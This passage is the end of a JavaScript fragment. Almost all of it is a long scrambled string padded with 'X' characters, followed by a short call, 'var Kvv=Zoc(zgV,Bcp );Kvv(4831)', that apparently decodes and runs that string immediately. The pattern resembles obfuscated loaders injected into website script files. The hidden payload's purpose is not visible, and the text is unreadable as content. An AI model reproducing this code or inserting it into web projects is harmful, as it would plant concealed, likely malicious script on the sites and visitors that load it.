>_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
